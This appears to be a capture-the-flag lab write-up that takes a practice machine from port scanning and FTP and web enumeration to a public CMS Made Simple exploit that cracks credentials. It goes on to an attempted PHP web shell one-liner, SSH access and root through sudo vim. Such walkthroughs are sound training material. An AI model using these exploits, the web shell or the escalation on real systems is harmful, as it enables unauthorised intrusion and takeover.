# Simple CTF

### Target

- Target IP: `10.67.138.41`

### Reconnaissance

A complete port scan and service detection were performed with Nmap:

```bash
nmap -T5 -sS -sCV -p- --stats-every=5s -Pn 10.67.138.41
```

![](image.png)

Based on the results, **FTP**, **HTTP**, and **SSH** services were identified. In addition:

- **Anonymous** access enabled on FTP.
- Presence of `robots.txt` in the HTTP service.

Next, the enumeration of the FTP service was prioritized.

### FTP enumeration

The content available with anonymous access was enumerated.

![](image%201.png)

The file found contained the following clue:

![](image%202.png)

> "Damn, man... you're the worst developer I've ever seen. You gave the system user the same password, and it's so weak... I cracked it in seconds. God... what a disaster."
> 

This message suggests that **the password matches the username**. Therefore, the next goal is to identify a valid user for authentication on the web panel or via SSH.

### HTTP enumeration

We continued enumerating the web service using `Nikto`, `WhatWeb`, and `Gobuster`.

```bash
nikto -h http://10.67.138.41/
```

![](image%203.png)

```bash
whatweb http://10.67.138.41/
```

![](image%204.png)

```bash
gobuster dir -u http://10.67.138.41/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```

![](image%205.png)

Source code review (no relevant findings):

![](image%206.png)

The relevant findings were `robots.txt` and the `/simple` directory. When accessing these paths, the following was observed:

![](image%207.png)

A CMS was identified and a possible user was obtained, in addition to the version (**CMS Made Simple 2.2.8**):

![](image%208.png)

Authentication was attempted with the user found, but it was not valid for the administration panel:

![](image%209.png)

Similarly, attempts were made via SSH without success at this stage:

![](image%2010.png)

### Exploit search

Public exploits were searched for the detected version:

```bash
searchsploit "CMS Made Simple" 2.2.8
```

![](image%2011.png)

Based on the results, an applicable vulnerability was selected to retrieve credentials and access the administration panel:

![](image%2012.png)

The exploit includes examples of use and variables to be used:

![](image%2013.png)

The exploit was executed with the indicated syntax:

```bash
python2 46635.py -u http://10.67.138.41/simple --crack -w /usr/share/wordlists/rockyou.txt
```

![](image%2014.png)

Crack result:

![](image%2015.png)

With these credentials, it was possible to log in:

- `mitch` → `secret`

![](image%2016.png)

![](image%2017.png)

### Web shell attempt (not viable)

An attempt was made to create a *web shell* in the CMS by adding a section that would interpret PHP code:

![](image%2018.png)

As a best practice, a hash-like name was used to reduce third-party access to the *web shell*:

![](image%2019.png)

The file with the payload was uploaded:

![](image%2020.png)

```php
<?php system($_GET['cmd']); ?>
```

In this case, the CMS did not accept files with the `.php` extension. Before attempting alternative techniques, the credentials recovered over SSH were validated.

### Initial access (SSH)

![](image%2021.png)

```bash
ssh mitch@10.67.138.41 -p 2222
```

```bash
/bin/bash
```

![](image%2022.png)

### Local enumeration

Enumeration of local directories and resources:

![](image%2023.png)

### Privilege escalation

The user's sudo permissions were reviewed:

![](image%2024.png)

The permission indicates that `vim` can be executed as **root**. To obtain a privileged shell:

```bash
sudo vim -c ':!/bin/bash'
```

![](image%2025.png)

### Flags and completion

With root privileges, the required flags were obtained:

![](image%2026.png)

The responses requested by the platform were recorded:

![](image%2027.png)

![](image%2028.png)

Challenge completed:

![](image%2029.png)